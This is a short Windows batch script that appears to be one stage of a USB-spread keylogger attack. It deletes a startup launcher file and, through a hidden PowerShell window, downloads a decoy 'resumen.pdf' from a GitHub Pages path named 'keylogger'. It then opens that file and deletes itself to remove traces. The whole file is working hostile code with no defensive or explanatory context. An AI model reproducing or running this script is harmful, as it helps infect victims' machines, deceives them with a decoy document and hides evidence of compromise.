@echo off

REM Delete USB detection program
set "USB_LAUNCHER=C:\Users%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\usb_launcher.cmd"
del /F %USB_LAUNCHER%

REM Define document variables
set "DOCUMENT_URL=https://mynewaccount-website.github.io/keylogger/resumen.pdf"
set "DOCUMENT_PATH=%TEMP%\resumen.pdf"

REM Download document
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%DOCUMENT_URL%' -OutFile '%DOCUMENT_PATH%'"

REM Run the downloaded document
start "" "%DOCUMENT_PATH%"

REM Auto-delete / cleanup
set "THIS_SCRIPT_PATH=%~nx0"
del /F %THIS_SCRIPT_PATH%

exit